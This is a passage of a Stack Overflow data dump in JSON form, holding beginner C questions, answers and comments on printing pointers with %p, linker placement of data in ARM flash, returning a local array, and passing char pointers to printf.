others.  Windows compiler is technically letting through Undefined Behaviour."}, {"owner": {"reputation": 21, "user_id": 7008800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf4f969c960794b77464822ba952019d?s=128&d=identicon&r=PG&f=1", "display_name": "Marieke", "link": "https://stackoverflow.com/users/7008800/marieke"}, "edited": false, "score": 0, "creation_date": 1476287695, "post_id": 40002864, "comment_id": 67283965, "body": "In CodeBlocks, I don&#39;t actually use any command line, I just click the &quot;compile and run&quot; button within CodeBlocks. In Linux, I use"}, {"owner": {"reputation": 21, "user_id": 7008800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf4f969c960794b77464822ba952019d?s=128&d=identicon&r=PG&f=1", "display_name": "Marieke", "link": "https://stackoverflow.com/users/7008800/marieke"}, "edited": false, "score": 0, "creation_date": 1476287717, "post_id": 40002864, "comment_id": 67283982, "body": "gcc -std=c99 -Wall -pedantic fileName.c"}, {"owner": {"reputation": 5748, "user_id": 767442, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/d26ad3fe7caf43447e39cd2307b515d7?s=128&d=identicon&r=PG&f=1", "display_name": "jforberg", "link": "https://stackoverflow.com/users/767442/jforberg"}, "edited": false, "score": 0, "creation_date": 1476288570, "post_id": 40002864, "comment_id": 67284546, "body": "So many confused comments in this thread. int * to void * conversion is automatic in C, it&#39;s completely valid and should not generate warnings.  The likely issue here is that OP is using a C++ compiler instead of a C compiler. In C++, the conversion is not automatic."}, {"owner": {"reputation": 6316, "user_id": 3323096, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/1227f90127f0f7b8678a8c13261f48b4?s=128&d=identicon&r=PG", "display_name": "Vality", "link": "https://stackoverflow.com/users/3323096/vality"}, "reply_to_user": {"reputation": 5748, "user_id": 767442, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/d26ad3fe7caf43447e39cd2307b515d7?s=128&d=identicon&r=PG&f=1", "display_name": "jforberg", "link": "https://stackoverflow.com/users/767442/jforberg"}, "edited": false, "score": 5, "creation_date": 1476288635, "post_id": 40002864, "comment_id": 67284591, "body": "@jforberg This is a variadic function, they dont do auto conversions other than the standard promotions."}, {"owner": {"reputation": 25937, "user_id": 338904, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/dea29233fa03ea84f8a853102deb0344?s=128&d=identicon&r=PG", "display_name": "e2-e4", "link": "https://stackoverflow.com/users/338904/e2-e4"}, "edited": false, "score": 0, "creation_date": 1476288660, "post_id": 40002864, "comment_id": 67284605, "body": "Did he include <code>stdio.h</code>? (if the message is actually not related to <code>void *</code> ...)\\"}, {"owner": {"user_type": "does_not_exist", "display_name": "user824425"}, "edited": false, "score": 1, "creation_date": 1476288681, "post_id": 40002864, "comment_id": 67284623, "body": "Just to note: there is (usually) no way that <code>printf</code> can know the type of the arguments beyond the format string. If you say <code>&quot;%p&quot;</code>, <code>printf</code> will just assume you gave it a void pointer. Only compilers/interpreters can notice such discrepancies. GCC and Clang are better at it than Microsoft&#39;s C compiler, but that depends on the compiler flags."}, {"owner": {"reputation": 21, "user_id": 7008800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf4f969c960794b77464822ba952019d?s=128&d=identicon&r=PG&f=1", "display_name": "Marieke", "link": "https://stackoverflow.com/users/7008800/marieke"}, "reply_to_user": {"reputation": 5748, "user_id": 767442, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/d26ad3fe7caf43447e39cd2307b515d7?s=128&d=identicon&r=PG&f=1", "display_name": "jforberg", "link": "https://stackoverflow.com/users/767442/jforberg"}, "edited": false, "score": 0, "creation_date": 1476288991, "post_id": 40002864, "comment_id": 67284819, "body": "@jforberg I&#39;m quite new to programming, my teacher just taught me this as a kind of standard compile line for programming in C. Should I be using a different one from gcc -std=c99 -Wall -pedantic fileName.c?"}, {"owner": {"reputation": 21, "user_id": 7008800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf4f969c960794b77464822ba952019d?s=128&d=identicon&r=PG&f=1", "display_name": "Marieke", "link": "https://stackoverflow.com/users/7008800/marieke"}, "edited": false, "score": 0, "creation_date": 1476289057, "post_id": 40002864, "comment_id": 67284862, "body": "I included stdio.h and stdlib.h"}, {"owner": {"reputation": 55871, "user_id": 10077, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/be4e820c7af6f3b79cf055d984cda7ff?s=128&d=identicon&r=PG", "display_name": "Fred Larson", "link": "https://stackoverflow.com/users/10077/fred-larson"}, "reply_to_user": {"reputation": 21, "user_id": 7008800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf4f969c960794b77464822ba952019d?s=128&d=identicon&r=PG&f=1", "display_name": "Marieke", "link": "https://stackoverflow.com/users/7008800/marieke"}, "edited": false, "score": 0, "creation_date": 1476289126, "post_id": 40002864, "comment_id": 67284911, "body": "@Marieke: I think your gcc compile line is just fine. You might look into beefing up your compile warnings in CodeBlocks, but I&#39;m not familiar enough with that IDE (or Microsoft compile switches) to tell you how."}, {"owner": {"reputation": 5748, "user_id": 767442, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/d26ad3fe7caf43447e39cd2307b515d7?s=128&d=identicon&r=PG&f=1", "display_name": "jforberg", "link": "https://stackoverflow.com/users/767442/jforberg"}, "reply_to_user": {"reputation": 21, "user_id": 7008800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf4f969c960794b77464822ba952019d?s=128&d=identicon&r=PG&f=1", "display_name": "Marieke", "link": "https://stackoverflow.com/users/7008800/marieke"}, "edited": false, "score": 0, "creation_date": 1476289225, "post_id": 40002864, "comment_id": 67284973, "body": "@Marieke, I was wrong for the reason explained by Vality. I have edited this answer to highlight the difference between variadic and normal functions in this case, hopefully making it more clear."}, {"owner": {"reputation": 21, "user_id": 7008800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf4f969c960794b77464822ba952019d?s=128&d=identicon&r=PG&f=1", "display_name": "Marieke", "link": "https://stackoverflow.com/users/7008800/marieke"}, "edited": false, "score": 0, "creation_date": 1476289425, "post_id": 40002864, "comment_id": 67285098, "body": "All right, I understand (enough of) what goes wrong for %p now. Thank you! By the way, the reader I got has an exercise with pointers that does the same thing, but with %x instead of %p. This goes wrong in the compiler within Geany already, but not in the one from CodeBlocks. Is this also just a sign of the compiler in CodeBlocks not being very good?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1476289544, "post_id": 40002864, "comment_id": 67285169, "body": "<code>%x</code> is not for use with pointer values. It might &quot;work&quot;, but not if pointer and int are different sizes."}, {"owner": {"reputation": 21, "user_id": 7008800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf4f969c960794b77464822ba952019d?s=128&d=identicon&r=PG&f=1", "display_name": "Marieke", "link": "https://stackoverflow.com/users/7008800/marieke"}, "edited": false, "score": 0, "creation_date": 1476289954, "post_id": 40002864, "comment_id": 67285427, "body": "I thought so too, but the thing is, CodeBlocks makes it seem like it does work. Moral of the story: don&#39;t use CodeBlocks if you can use Linux?"}, {"owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "reply_to_user": {"reputation": 21, "user_id": 7008800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf4f969c960794b77464822ba952019d?s=128&d=identicon&r=PG&f=1", "display_name": "Marieke", "link": "https://stackoverflow.com/users/7008800/marieke"}, "edited": false, "score": 2, "creation_date": 1476290461, "post_id": 40002864, "comment_id": 67285710, "body": "@Marieke: If the conversion specifier and argument types don&#39;t match in a <code>printf</code> statement, the behavior is <i>undefined</i>.  Compilers are not required to issue a diagnostic for undefined behavior.  Also, one possible manifestation of undefined behavior is that your code works as expected.  The only moral here is that you need to a) crank up your warning levels as high as possible, whatever compiler you are using, and b) learn what types go with which format specifier."}, {"owner": {"reputation": 55871, "user_id": 10077, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/be4e820c7af6f3b79cf055d984cda7ff?s=128&d=identicon&r=PG", "display_name": "Fred Larson", "link": "https://stackoverflow.com/users/10077/fred-larson"}, "reply_to_user": {"reputation": 21, "user_id": 7008800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf4f969c960794b77464822ba952019d?s=128&d=identicon&r=PG&f=1", "display_name": "Marieke", "link": "https://stackoverflow.com/users/7008800/marieke"}, "edited": false, "score": 0, "creation_date": 1476297167, "post_id": 40002864, "comment_id": 67289725, "body": "@Marieke: It doesn&#39;t really have anything to do with CodeBlocks, because CodeBlocks is not a compiler. It is an IDE. It uses a compiler on your system, such as MSVC or gcc."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1476312016, "post_id": 40002864, "comment_id": 67297148, "body": "Note that using using <code>&quot;%p&quot;</code> and <code>(void*)</code> may/may not work well with <i>function</i> pointers.   Conversion from a function pointer type to a <code>void *</code> as in <code>printf(&quot;%p\\n&quot;, (void*)main);</code> is UB by omission."}], "tags": [], "owner": {"reputation": 55871, "user_id": 10077, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/be4e820c7af6f3b79cf055d984cda7ff?s=128&d=identicon&r=PG", "display_name": "Fred Larson", "link": "https://stackoverflow.com/users/10077/fred-larson"}, "is_accepted": false, "score": 5, "last_activity_date": 1476289150, "last_edit_date": 1476289150, "creation_date": 1476287098, "answer_id": 40002864, "question_id": 40002778, "link": "https://stackoverflow.com/questions/40002778/how-to-print-a-memory-address/40002864#40002864", "title": "How to print a memory address?", "body": "<p>The <code>%p</code> specifier expects a <code>void*</code>, and you're giving it an <code>int*</code>. So just cast it:</p>\n\n<pre><code>printf(\"%p\\n\", (void*)&amp;var);\n</code></pre>\n\n<p>If this were a normal function, the conversion from int * to void * would be automatic and would not generate warnings. But since printf() is a variadic function, the conversion has to be explicit. Arguments to variadic functions are not required to be type-checked. However, some compilers know how the standard functions, including printf(), work and will warn about incorrect usage.</p>\n"}], "owner": {"reputation": 21, "user_id": 7008800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf4f969c960794b77464822ba952019d?s=128&d=identicon&r=PG&f=1", "display_name": "Marieke", "link": "https://stackoverflow.com/users/7008800/marieke"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 682, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1476358514, "creation_date": 1476286831, "last_edit_date": 1476358514, "question_id": 40002778, "link": "https://stackoverflow.com/questions/40002778/how-to-print-a-memory-address", "title": "How to print a memory address?", "body": "<p>I've seen on youtube tutorials about pointers that people <code>printf</code> the memory address of a variable. The video in question did this in Code:Blocks, and it works there with <code>%p</code>, but whenever I try the exact same thing in Geany (VirtualBox) I get a compiling error. Should I try another kind of %letter Linux?</p>\n\n<pre><code>      int main(int argc, char *argv[]){\n          int var;\n\n          printf(\"%p\\n\", &amp;var);\n\n          return 0;\n       }\n</code></pre>\n\n<p>I don't need it for an exercise or something, just curiosity (and to better understand the concept of pointers, I guess). \nThanks in advance!</p>\n\n<p>EDIT: The error message is that Linux wants me to cast <code>&amp;var</code> to a <code>(void*)</code> before it can print it. Sorry, I wasn't completely clear: my question is basically, is this a Linux/Windows thing? And why does Windows accept it as they are, while Linux wants me to cast it as a <code>void</code>-pointer?</p>\n\n<p><a href=\"https://i.stack.imgur.com/AFgZc.png\" rel=\"nofollow\">error message:</a></p>\n"}, {"tags": ["c", "gcc", "arm", "ld", "flash-memory"], "comments": [{"owner": {"reputation": 18888, "user_id": 1880339, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/0PkGx.png?s=128&g=1", "display_name": "artless noise", "link": "https://stackoverflow.com/users/1880339/artless-noise"}, "edited": false, "score": 2, "creation_date": 1476286877, "post_id": 40002461, "comment_id": 67283367, "body": "Un-programmed flash memory reads as 0xffff.  How does the code/data get to the device?  Also, you need routines to do the <i>special</i> sequence to program the code for the update.  I would suggest that you do not try to initialize the data in &#39;flash&#39;.  Instead keep a default ROM copy (which seems to work/program).  If you read 0xffff, then call you flash program routine to make it the default.  Also you can provide an option to <i>restore defaults</i>.  There are issues with the loading tools and binary format that need to be resolved otherwise.  Please read about <i>VMA</i> and <i>LMA</i> in the LD documents."}, {"owner": {"reputation": 18888, "user_id": 1880339, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/0PkGx.png?s=128&g=1", "display_name": "artless noise", "link": "https://stackoverflow.com/users/1880339/artless-noise"}, "edited": false, "score": 1, "creation_date": 1476287250, "post_id": 40002461, "comment_id": 67283642, "body": "You should probably do a checksum/crc, etc of the flash configuration data.  If it is bad, then you can use the defaults which will reside in ROM (and could be set via a define).  The flash may go bad during normal use (lasts ~10 yrs?) and the user will at least still have a semi-functioning device if it goes bad and you use sensible defaults (as opposed to random garbage)."}, {"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 0, "creation_date": 1476288758, "post_id": 40002461, "comment_id": 67284671, "body": "Related:<a href=\"http://stackoverflow.com/questions/39892860/linker-script-does-not-skip-bytes-as-expected/39900613#39900613\" title=\"linker script does not skip bytes as expected\">stackoverflow.com/questions/39892860/&hellip;</a> The answer there might be answering this as well"}, {"owner": {"reputation": 71, "user_id": 5472864, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1332489b6a8a6aef3e4eae642777753f?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel", "link": "https://stackoverflow.com/users/5472864/daniel"}, "edited": false, "score": 0, "creation_date": 1476424901, "post_id": 40002461, "comment_id": 67348335, "body": "artless noise, that is exatly what I implemented in the meantime. And while implementing I came to the same solution, that it would be beneficial to have the default data in ROM and write it to the flash in order to be able to restore factory defaults. Thanks for you comment."}, {"owner": {"reputation": 888, "user_id": 1096140, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5rFfC.jpg?s=128&g=1", "display_name": "hesham_EE", "link": "https://stackoverflow.com/users/1096140/hesham-ee"}, "reply_to_user": {"reputation": 18888, "user_id": 1880339, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/0PkGx.png?s=128&g=1", "display_name": "artless noise", "link": "https://stackoverflow.com/users/1880339/artless-noise"}, "edited": false, "score": 0, "creation_date": 1476451567, "post_id": 40002461, "comment_id": 67364536, "body": "If you are flashing your device with a tools that knows how to write flash at 0x200C0000, it&#39;ll do it for you. Otherwise, I&#39;d recomment the 1st comment of @artless noise."}], "owner": {"reputation": 71, "user_id": 5472864, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1332489b6a8a6aef3e4eae642777753f?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel", "link": "https://stackoverflow.com/users/5472864/daniel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1265, "favorite_count": 1, "answer_count": 0, "score": 3, "last_activity_date": 1476286758, "creation_date": 1476285874, "last_edit_date": 1476286758, "question_id": 40002461, "link": "https://stackoverflow.com/questions/40002461/arm-gcc-linker-how-to-put-data-at-absolute-address-in-rw-non-volatile-memory", "title": "Arm GCC linker: how to put data at absolute address in (rw)-non-volatile memory", "body": "<p>I am facing the following problem. I am programming an ARM cortex M4 micro controller and I would like it to have a default value for IP address, netmask, gateway and so on. This default values should be changeable via serial communication AND the changes should be persistent.\nFor example: default value for IP address and netmask are:\n  192.168.1.20\n  255.255.255.0\nThe user changes the address and netmask to\n  192.168.2.10\n  255.255.255.0\nNow after disconnecting and reconnecting the unit to power supply the \"default\" values should be the user entered (192.168.2.10/255.255.255.0)</p>\n\n<p>To solve this, I thought about using the so called work flash memory of my uC. This is a non-volatile memory which can be written using special commands.\nWhat I am trying to achieve is to define default values in the program code (as variables at the moment, or as defines later if possible) which are picked up by the linker and whose VALUE is put to the non-volatile memory (work flash) at address 0x200C000.</p>\n\n<p>Right now my linker file looks like this:</p>\n\n<pre><code>MEMORY\n{\n    rom  (rx)  : ORIGIN = 0x00000000, LENGTH = 0x100000 /* 1MB */\n    ram  (rwx) : ORIGIN = 0x1FFF0000, LENGTH = 0x10000 /* 64K  */\n    ram1 (rwx) : ORIGIN = 0x20038000, LENGTH = 0x10000  /* 64K  */\n    wofl (rwx) : ORIGIN = 0x200C0000, LENGTH = 0x8000   /* 32K  */\n}\n\n...\n\n.wifi_defaults :\n{\n    KEEP(*(.wifi_defaults*));\n} &gt; wofl\n\n...\n</code></pre>\n\n<p>and the variable declaration in the source code (just for testing):</p>\n\n<pre><code>uint16_t __attribute__((section(\".wifi_defaults\"))) test= 0x00D0;\n</code></pre>\n\n<p>The .map file shows me:</p>\n\n<pre><code>.wifi_defaults  0x200c0000        0x2\n *(.wifi_defaults*)\n .wifi_defaults\n                0x200c0000        0x2 ..\\obj\\HSFirmware.o\n                0x200c0000                test\n</code></pre>\n\n<p>But when accessing the variable I am not getting the correct value, just the initial 0xFFFF which was returned even before starting to mess with the linker stuff.</p>\n\n<p>I also tried to use a CONST in front of the variable declaration, which made no difference.</p>\n\n<p>As far as I understand my code puts an uninitialized variable at the specified code segment. How can I put an initialized variable at the given address?</p>\n"}, {"tags": ["c", "segmentation-fault"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 4, "creation_date": 1476285683, "post_id": 40002361, "comment_id": 67282440, "body": "<code>text</code> which is local variable in <code>getstr</code>, has gone out of scope and life after <code>getstr</code> exits. So it is <i>undefined behaviour</i> anyway."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 2, "creation_date": 1476285883, "post_id": 40002361, "comment_id": 67282603, "body": "In addition to the core problem of returning a pointer to a local variable, <code>getstr()</code> is not a valid function definition in modern C. In the old version of C, that you for some reason use, your function would get translated to <code>int getstr(void)</code> which is nonsense. You should get a modern, free compiler and configure it to compile the code as standard C."}, {"owner": {"reputation": 157, "user_id": 2860157, "user_type": "registered", "accept_rate": 50, "profile_image": "https://graph.facebook.com/100000477471176/picture?type=large", "display_name": "Nick Kobishev", "link": "https://stackoverflow.com/users/2860157/nick-kobishev"}, "edited": false, "score": 0, "creation_date": 1476286833, "post_id": 40002361, "comment_id": 67283333, "body": "as i said, im new to c, currently doing exercises from &#39;The C programming language&#39; by kernighan and ritchie. i suppose i did miss the return type in the function, also i suppose this kind of function would require the use of pointers, which i haven&#39;t covered yet. am i correct?"}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 1, "creation_date": 1476289738, "post_id": 40002361, "comment_id": 67285292, "body": "yes, the way to do this is to pass <code>test</code> into your <code>getstr()</code> function and have the string get constructed in there. No need to return anything from <code>getstr()</code> or do a <code>strcpy</code> when you return (unless you want a duplicate of <code>test</code> for some reason, in which case you&#39;ll need <code>char test2[MAX_CHAR];</code>)"}], "owner": {"reputation": 157, "user_id": 2860157, "user_type": "registered", "accept_rate": 50, "profile_image": "https://graph.facebook.com/100000477471176/picture?type=large", "display_name": "Nick Kobishev", "link": "https://stackoverflow.com/users/2860157/nick-kobishev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 29, "favorite_count": 0, "closed_date": 1476285756, "answer_count": 0, "score": 0, "last_activity_date": 1476285613, "creation_date": 1476285613, "question_id": 40002361, "link": "https://stackoverflow.com/questions/40002361/segmentation-fault-on-strcpy-attempt", "closed_reason": "Duplicate", "title": "segmentation fault on strcpy attempt", "body": "<p>attempting to run the following code, and everything runs fine until i try to strcpy to the <code>test</code> variable/</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n#define MAXTEXT 800\n\nint main()\n{\n    char test[MAXTEXT] = {0};\n    strcpy(test, getstr());\n    return 0;\n}\n\ngetstr(){\n    int c, text_pos;\n    char text[MAXTEXT] = {0};\n    for(text_pos=0; text_pos &lt; MAXTEXT &amp;&amp; (c = getchar()) != EOF; text_pos++){\n        text[text_pos] = c;\n    }\n    return text;\n}\n</code></pre>\n\n<p>the the program crashes with a segmentation fault. I'm new to C so I don't really understand what this all means.</p>\n\n<p>thanks.</p>\n"}, {"tags": ["c", "pointers", "printf"], "comments": [{"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 2, "creation_date": 1476292979, "post_id": 40002185, "comment_id": 67287253, "body": "&quot;<i><code>*p</code> points to a contiguous block of memory</i>&quot; it points nowhere, as <code>*p</code> isn&#39;t a pointer but evaluates to a <code>char</code>."}], "answers": [{"tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": false, "score": 1, "last_activity_date": 1476285332, "creation_date": 1476285332, "answer_id": 40002245, "question_id": 40002185, "link": "https://stackoverflow.com/questions/40002185/char-pointers-and-the-printf-function/40002245#40002245", "title": "Char pointers and the printf function", "body": "<p>The <code>%c</code> format specifier expects a <code>char</code> type, and will output a <em>single</em> <code>char</code> value.</p>\n\n<p>The first parameter to <code>printf</code> must be a <code>const char*</code> (a <code>char*</code> can convert implicitly to a <code>const char*</code>) and points to the <em>start</em> of a <em>string</em> of characters. It stops printing when it encounters a <code>\\0</code> in that string. If there is not a <code>\\0</code> present in that string then the behaviour of that function is <em>undefined</em>. Because <code>\"abc\"</code> doesn't contain any format specifiers, you don't pass any additional arguments to <code>printf</code> in that case.</p>\n"}, {"tags": [], "owner": {"reputation": 17910, "user_id": 3963067, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/1e536542e9baa5c52499d61fb64f51d3?s=128&d=identicon&r=PG&f=1", "display_name": "gmoniava", "link": "https://stackoverflow.com/users/3963067/gmoniava"}, "is_accepted": false, "score": 2, "last_activity_date": 1476285739, "last_edit_date": 1476285739, "creation_date": 1476285371, "answer_id": 40002260, "question_id": 40002185, "link": "https://stackoverflow.com/questions/40002185/char-pointers-and-the-printf-function/40002260#40002260", "title": "Char pointers and the printf function", "body": "<p>You are misunderstanding, indeed when you do</p>\n\n<pre><code>char *p = \"Hello\";\n</code></pre>\n\n<p><code>p</code> points to the starting address where literal \"Hello\" is stored. This is how you <strong>declare</strong> pointers. However, when afterwards, you do</p>\n\n<pre><code>*p\n</code></pre>\n\n<p>it means <strong>dereference</strong> <code>p</code> and obtain object where <code>p</code> points. In our above example this would yield 'H'. This should clarify your second question.</p>\n\n<p>In case of printf just try</p>\n\n<pre><code>printf(\"Hello\");\n</code></pre>\n\n<p>which is also fine; this answers your first question because it is effectively the same what you did when passed just <code>p</code> to printf.</p>\n\n<hr>\n\n<p>Finally to your edit, indeed</p>\n\n<pre><code>printf(*p);\n</code></pre>\n\n<p>above line is not correct since printf expects <code>const char *</code> and by using <code>*p</code> you are passing it a <code>char</code> - or in other words 'H' assuming our example. Read more what dereferencing means.</p>\n"}, {"comments": [{"owner": {"reputation": 669, "user_id": 5076511, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WubM0.jpg?s=128&g=1", "display_name": "Fabulous", "link": "https://stackoverflow.com/users/5076511/fabulous"}, "edited": false, "score": 0, "creation_date": 1476286369, "post_id": 40002265, "comment_id": 67282987, "body": "pointer to the format string? won&#39;t <code>p[0]</code> be treated as the format string itself?"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "reply_to_user": {"reputation": 669, "user_id": 5076511, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WubM0.jpg?s=128&g=1", "display_name": "Fabulous", "link": "https://stackoverflow.com/users/5076511/fabulous"}, "edited": false, "score": 2, "creation_date": 1476293427, "post_id": 40002265, "comment_id": 67287514, "body": "@simrandhamija: &quot;<i><code>p[0]</code></i>&quot; isn&#39;t a &quot;string&quot; but a character, just one <code>char</code>. There is a difference between <code>&#39;A&#39;</code> and <code>&quot;A&quot;</code>. The former is a <code>char</code>-literal, the latter is a &quot;string&quot;-literal, which in fact is a &#39;0&#39;-terminated array of <code>char</code>."}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": true, "score": 19, "last_activity_date": 1476293839, "last_edit_date": 1476293839, "creation_date": 1476285378, "answer_id": 40002265, "question_id": 40002185, "link": "https://stackoverflow.com/questions/40002185/char-pointers-and-the-printf-function/40002265#40002265", "title": "Char pointers and the printf function", "body": "<p>For your first question, the <a href=\"http://en.cppreference.com/w/c/io/fprintf\" rel=\"noreferrer\"><code>printf</code> function (and family)</a> takes a string as first argument (i.e. a <code>const char *</code>). That string could contain format codes that the <code>printf</code> function will replace with the corresponding argument. The rest of the text is printed as-is, verbatim. And that's what is happening when you pass <code>p</code> as the first argument.</p>\n\n<p>Do note that using <code>printf</code> this way is highly unrecommended, especially if the string is contains input from a user. If the user adds formatting codes in the string, and you don't provide the correct arguments then you will have <em>undefined behavior</em>. It could even lead to security holes.</p>\n\n<p>For your second question, the variable <code>p</code> points to some memory. The expression <code>*p</code> dereferences the pointer to give you a single character, namely the one that <code>p</code> is actually pointing to, which is <code>p[0]</code>.</p>\n\n<p>Think of <code>p</code> like this:</p>\n\n<pre>\n+---+      +-----+-----+-----+------+\n| p | ---> | 'a' | 'b' | 'c' | '\\0' |\n+---+      +-----+-----+-----+------+\n</pre>\n\n<p>The variable <code>p</code> doesn't really point to a \"string\", it only points to some single location in memory, namely the first character in the string <code>\"abc\"</code>. It's the functions using <code>p</code> that treat that memory as a sequence of characters.</p>\n\n<p>Furthermore, constant string literals are actually stored as (read-only) arrays of the number of character in the string plus one for the string terminator.</p>\n\n<p>Also, to help you understand why <code>*p</code> is the same as <code>p[0]</code> you need to know that for any pointer <em>or array</em> <code>p</code> and valid index <code>i</code>, the expressions <code>p[i]</code> is equal to <code>*(p + i)</code>. To get the first character, you have index <code>0</code>, which means you have <code>p[0]</code> which then should be equal to <code>*(p + 0)</code>. Adding zero to anything is a no-op, so <code>*(p + 0)</code> is the same as <code>*(p)</code> which is the same as <code>*p</code>. Therefore <code>p[0]</code> is equal to <code>*p</code>.</p>\n\n<hr>\n\n<p>Regarding your edit (where you do <code>printf(*p)</code>), since <code>*p</code> returns the value of the first \"element\"  pointed to by <code>p</code> (i.e. <code>p[0]</code>) you are passing a <em>single character</em> as the pointer to the format string. This will lead the compiler to convert it to a pointer which is pointing to whatever address has the value of that single character (it doesn't convert the character to a pointer <em>to</em> the character). This address is not a very valid address (in the <a href=\"http://en.cppreference.com/w/c/language/ascii\" rel=\"noreferrer\">ASCII alphabet</a> <code>'a'</code> has the value <code>97</code> which is the address where the program will look for the string to print) and you will have <em>undefined behavior</em>.</p>\n"}, {"tags": [], "owner": {"reputation": 9718, "user_id": 3294441, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/UwdVL.png?s=128&g=1", "display_name": "QuestionC", "link": "https://stackoverflow.com/users/3294441/questionc"}, "is_accepted": false, "score": 2, "last_activity_date": 1476293517, "last_edit_date": 1476293517, "creation_date": 1476285634, "answer_id": 40002368, "question_id": 40002185, "link": "https://stackoverflow.com/questions/40002185/char-pointers-and-the-printf-function/40002368#40002368", "title": "Char pointers and the printf function", "body": "<blockquote>\n  <ol>\n  <li>why did printf not require a format specifier in the second case? Is printf(pointer_name) enough to print the value of the pointer?</li>\n  </ol>\n</blockquote>\n\n<p>\"abc\" <em>is</em> your format specifier.  That's why it's printing \"abc\".  If the string had contained <code>%</code>, then things would have behaved strangely, but they didn't.</p>\n\n<pre><code>printf(\"abc\"); // Perfectly fine!\n</code></pre>\n\n<blockquote>\n  <ol start=\"2\">\n  <li>why did printf not require a format specifier in the second case? Is 